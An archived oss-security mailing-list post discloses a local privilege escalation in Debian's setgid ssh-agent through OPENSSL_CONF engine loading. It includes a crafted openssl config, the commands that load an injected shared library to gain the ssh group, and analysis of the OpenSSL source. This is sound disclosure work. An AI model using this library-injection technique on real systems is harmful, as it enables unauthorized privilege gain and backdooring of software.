X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8574" "Monday" "25" "December" "2017" "12:01:13" "+0000" "halfdog" "me@halfdog.net" "<1551-1514203273.928126@aiRv.IBNV.Miod>" "256" "[oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL" "^Date:" nil nil "12" "2017122512:01:13" "[oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL" (number mark "        me@halfdog.n Dec 25  256/8574  " thread-indent "\"[oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 13547 invoked by uid 550); 25 Dec 2017 12:02:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 13513 invoked from network); 25 Dec 2017 12:02:37 -0000
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
Message-ID: <1551-1514203273.928126@aiRv.IBNV.Miod>
Date: Mon, 25 Dec 2017 12:01:13 +0000
From: halfdog <me@halfdog.net>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL
To: oss-security@lists.openwall.com

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Hello List,

This seems to be just a funny bug and no security problem, as
discussed on open[ssh/ssl]-security. As the sum of knowledge held
by a community is more than the parts, public should allow search
for better solution, thus avoiding an implementation with side
affectects causing more severe troubles in future. Read more at

http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/

hd


<-- Created by SecurityReportToText.xsl V20121225 -->

Gain Access to SSH Group via ssh-agent and OpenSSL
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

=3D=3D=3D Introduction =3D=3D=3D


=3D Problem description: =3D: On Debian, /ssh-agent/ is a set-group-id
binary with a nice feature to gain access to that group and execute
arbitrary code via included openssl library. Usually that would
be quite a bad security vulnerability, but at least for ssh-agent,
this is just a funny bug or unexpected behaviour. According to
man-pages:

************************************************************
ssh-agent is a program to hold private keys used for public key
authentication (RSA, DSA, ECDSA, Ed25519). ssh-agent is usually
started in the beginning of an X-session or a login session, and
all other windows or programs are started as clients to the ssh-agent
program. Through use of environment variables the agent can be
located and automatically used for authentication when logging
in to other machines using ssh(1).
************************************************************


The reason for ssh-agent being a SGID binary is also given
in the man pages:

************************************************************
In Debian, ssh-agent is installed with the set-group-id bit set,
to prevent ptrace(2) attacks retrieving private key material....
************************************************************


As ssh-agent is handling private key material, it uses the
/libcrypto.so/ from /libssl/ package for cryptography
related operations. To support integration of non-standard ciphers
or cryptohardware, openssl is very flexible regarding its configuration.
- From the /openssl (1)/ man page:

************************************************************
Many commands use an external configuration file for some or all
of their arguments and have a -config option to specify that file.
The environment variable OPENSSL_CONF can be used to specify the
location of the file. If the environment variable is not specified,
then the file is named openssl.cnf in the default certificate
storage area ...
************************************************************


Most interesting feature of the configuration is, that it supports
loading of shared libraries from non-standard locations using
the /dynamic_path/ configuration setting.


=3D=3D=3D Methods =3D=3D=3D


To elevate privileges, mahe ssh-agent use a crafted openssl
configuration via the /OPENSSL_CONF/ environment variable
and let it point to a file containing library loading instructions,
e.g. "load.conf" [idm38]:

************************************************************
# See http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/
# Copyright (c) 2017 halfdog <me (%) halfdog.net>
openssl_conf =3D openssl_def

[openssl_def]
engines =3D engine_section

[engine_section]
pkcs11 =3D pkcs11_section

[pkcs11_section]
engine_id =3D pkcs11
dynamic_path =3D /tmp/engine.so
default_algorithms =3D ALL
init =3D 1
************************************************************


The /engine.so/ is a standard shared object, that will
be loaded using /dlopen/ when the SSL engine is initialized.
"engine.c" [idm43] will just change /gid/ to
/egid/ and run //bin/sh/.

************************************************************
$ gcc -Wall -fPIC -c engine.c
$ id
uid=3D1000(test) gid=3D100(users) groups=3D100(users)
$ ld -shared -Bdynamic engine.o -L/lib -lc -o engine.so
$ cp engine.so load.conf /tmp
$ OPENSSL_CONF=3D/tmp/load.conf /usr/bin/ssh-agent
TestLib.c: Within _init
Process uid/gid at load: 1000/1000/1000 100/100/112
Process uid/gid after change: 1000/1000/1000 112/112/112
$ id
uid=3D1000(test) gid=3D112(ssh) groups=3D112(ssh),100(users)
************************************************************




=3D=3D=3D Results, Discussion =3D=3D=3D


=3D Openssl code: =3D: Openssl openssl-1.1.0
contains some code intended to protect against such attacks, see
/crypto/uid.c/:

************************************************************
int OPENSSL_issetugid(void)
{
    if (getuid() !=3D geteuid())
        return 1;
    if (getgid() !=3D getegid())
        return 1;
    return 0;
}
************************************************************


But this code is only active to disallow gaining randomness
from weak sources in SUID-binaries, see /crypto/rand/randfile.c/:

************************************************************
    if (OPENSSL_issetugid() !=3D 0) {
        use_randfile =3D 0;
    } else {
        s =3D getenv("RANDFILE");
        if (s =3D=3D NULL || *s =3D=3D '\0') {
            use_randfile =3D 0;
            s =3D getenv("HOME");
        }
    }
************************************************************


In /char *CONF_get1_default_config_file(void)/ plain getenv()
is used:

************************************************************
char *CONF_get1_default_config_file(void)
{
    char *file;
    int len;

    file =3D getenv("OPENSSL_CONF");
    if (file)
        return OPENSSL_strdup(file);
...
************************************************************

=3D Impact on Debian/ssh-agent: =3D: Here the impact is very limited: the S=
GID
binary is just here to avoid ptracing for key extraction. With
standard settings, even after gaining access to the group, the
process will still not be able to read the memory content of an
running ssh-agent.


=3D Impact on Debian/ssh-keysign: =3D: The binary //usr/lib/openssh/ssh-key=
sign/
is a SUID binary, but does not access the configuration environment
variable, thus no local-root-privilege escalation is possible.
The reason for that is not fully analyzed yet.


=3D Impact in general: =3D: The openssl engine loading allows to inject
arbitrary libraries during SSL engine initialization and therefore
might come in handy bypassing security restrictions in general
or to backdoor security software in specific.


=3D Other SSL implementations: =3D: At the moment, it is not known, if other
SSL libraries have copied the environment-configuration pattern
or have similar vulnerabilities not related to code duplication.
At the moment one implementation is already confirmed to have
anticipated the risks of environment variable use beforehand.
_Not affected:_

* _libressl_: Code was removed, see comments from "libressl lead developer =
Theo de Raadt" [idm78], info on "commits" [idm79]


=3D=3D=3D Open Questions =3D=3D=3D


Theo de Raadt also pointed out:
/I think older versions of openssl didn't inspect that environment
variable during a constructor, but only in active code.  So
applications could clean the environment space themselves.
I'm wondering if some systems run with openssl which doesn't take
the constructor approach.../
Maybe this is related to the reason why /ssh-agent/ is affected
but /ssh-keysign/ is not.


=3D=3D=3D Timeline =3D=3D=3D



* 20170608: Discovery
* 20171217: Report to openssh/openssl security
* 20171225: Opening of public discussion


=3D=3D=3D Material, References =3D=3D=3D



* My recommendations for a fix as "mail" [idm101]

>>> Last modified 20171225
Contact e-mail: me (%) halfdog.net <<<

* [idm38] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
load.conf
* [idm43] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
engine.c
* [idm48] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
engine.c
* [idm78] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
20171217-TheoDeRaadt-RePrivilegeEscalationToGroupSshInSshAgentViaOpensslLib=
rary.eml
* [idm79] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
20171219-TheoDeRaadt-LibresslCommitsAroundGetenv.eml
* [idm101] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges=
/201712192246-MailToOpenSshSslLists-RecommendationsForFix.eml
-----BEGIN PGP SIGNATURE-----

iF0EAREKAB0WIQQVaq6YuR8BFP6IK9jEWZOG/u2r7gUCWkDb5QAKCRDEWZOG/u2r
7n1mAJ4mnA5ze2v0i9Q+plzicIm0mgzP3QCfbfbzmK5ilojqO1PtXbALiVWbFWM=3D
=3DYui+
-----END PGP SIGNATURE-----


